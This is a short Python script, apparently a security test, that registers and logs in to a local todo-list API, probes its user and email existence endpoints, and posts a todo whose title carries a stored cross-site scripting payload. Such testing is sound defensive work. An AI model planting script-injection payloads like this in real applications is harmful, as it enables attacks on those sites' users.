import requests
from requests.auth import HTTPBasicAuth

BASE_URL = "http://localhost:8080"

class TodoWorkflowAttack:
    def __init__(self, username, password, email):
        self.username = username
        self.password = password
        self.email = email
        self.session = requests.Session()

    def signup(self):
        """Register a new user"""
        url = f"{BASE_URL}/api/auth/signup"
        data = {"username": self.username, "password": self.password, "email": self.email}
        resp = self.session.post(url, json=data)

        if resp.status_code == 200:
            print(f"[+] Signup success for {self.username}")
        else:
            print(f"[-] Signup failed: {resp.status_code} {resp.text}")

    def check_user(self):
        """Check if username exists"""
        url = f"{BASE_URL}/api/auth/checkuser"
        data = {"username": self.username}
        resp = self.session.post(url, json=data)

        print(f"[*] Checking user: {self.username} → {resp.text}")

    def check_email(self):
        """Check if email exists"""
        url = f"{BASE_URL}/api/auth/checkemail"
        data = {"email": self.email}
        resp = self.session.post(url, json=data)

        print(f"[*] Checking email: {self.email} → {resp.text}")

    def login(self):
        """Login with BasicAuth (username:password)"""
        url = f"{BASE_URL}/api/auth/login"
        resp = self.session.post(url, auth=HTTPBasicAuth(self.username, self.password))

        if resp.status_code == 200:
            print(f"[+] Login success as {self.username}")
        else:
            print(f"[-] Login failed: {resp.status_code} {resp.text}")

    def create_malicious_todo(self):
        """Insert a malicious todo item"""
        url = f"{BASE_URL}/api/todos"
        headers = {"Content-Type": "application/json"}
        payload = {"title": "<script>alert('XSS')</script>"}

        resp = self.session.post(url, headers=headers,
                                 auth=HTTPBasicAuth(self.username, self.password),
                                 json=payload)

        if resp.status_code == 200:
            print("[+] Malicious todo created!")
            print(resp.json())
        else:
            print(f"[-] Failed to create todo: {resp.status_code} {resp.text}")

    def run(self):
        self.signup()
        self.check_user()
        self.check_email()
        self.login()
        self.create_malicious_todo()


if __name__ == "__main__":
    attacker = TodoWorkflowAttack("user1", "xblaster", "blaslomibao@yahoo.com")
    attacker.run()
